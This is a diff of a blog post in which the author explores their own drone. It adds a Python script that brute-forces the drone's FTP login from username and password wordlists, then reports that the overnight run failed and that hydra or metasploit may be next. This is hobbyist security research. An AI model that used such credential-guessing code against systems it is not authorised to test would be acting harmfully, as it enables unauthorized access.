@@ -52,33 +52,56 @@ Well that's interesting! Obviously, I immediatly googled to see what results I'd
 So, my next step was to write a bruteforce method. I found some generic default FTP user/passes [here](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt). A simple python script to loop through them:
 
 ```python
-# importing the socket library and codecs to convert hexadecimals to bytes
-import socket
-import codecs
+import ftplib
 
-
-# defining the address to our drone
 HOST = '192.168.201.1'
-PORT = 21
+PORT = 2121
 
+server = ftplib.FTP()
+success = False
 
-# defining a socket object for TCP protocol
-sv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-# connecting to the drone
-sv.connect((HOST, PORT))
+while not success:
+    # Open the userlist file for each iteration to reset the iterator
+    with open("userlist.txt", "r") as unamelist:
+        for uname in unamelist:
+            uname = uname.strip()  # Strip newline characters
+            # Reopen the passlist file for each iteration to reset the iterator
+            with open("passlist.txt", "r") as passlist:
+                for passw in passlist:
+                    passw = passw.strip()  # Strip newline characters
 
-BUFFER_SIZE = 1024
+                    print(f'trying {uname}:{passw}')
 
-f = open('drone_stream.h264', 'wb')
-while True:
-    try:
-        # print("writing data")
-        data = sv.recv(BUFFER_SIZE)
-        f.write(data)
-        print(data)
-    except KeyboardInterrupt:
-        sv.close()
-        f.close()
+                    try:
+                        server.connect(HOST, PORT)
+                        server.login(uname, passw)
+                        success = True
+                        break  # Break out of the inner loop if login is successful
+
+                    except Exception as e:
+                        print(f"Server response: {e}, trying again...")
+
+            if success:
+                break  # Break out of the outer loop if login is successful
+
+if success:
+    print(f'Success! {uname}:{passw}')
+else:
+    print('Credentials not found')
+
+# You don't have to print this, because this command itself prints directory contents 
+server.dir()
 ```
 
 But no luck :(.
+
+# [30/03/24]
+
+So I left the brute force code running last night, until the drone battery died and it stopped:
+<img width="395" alt="image" src="https://github.com/maxsimmonds1337/maxsimmonds.engineer/assets/58208872/7cc5d465-8a26-470f-9ea3-419478455282">
+No luck, as you can see. I was trying variations of the SSID that the drone has. Previously, I know old sky routers (back when WEP was used!) used to have part of the WEP key in the SSID.... Stupid, I know. But, I thought perhaps something similar was happening here, maybe the FTP PW was part of the SSID, to make some sort of automation easier when flashing the drones, or some such thing. Well, if that's the case, I couldn't get it to work. I'm beginning to worry that the pass/user is randomly assigned, or is something that's not easily bruteforced.
+
+An issue I came across is that each connection/test takes ~3s. That does not scale well. While I can take apart a drone battery, and wire it up to a bench supply, so I could have the drone running indefinitely, 3s for every attempted will take ages, even longer since I can't even be sure of the username! Apparently an app called hydra, with concurrent connections, might be a better way forward, but let's see how metasploit handles this...
+
+## Metasploit
+
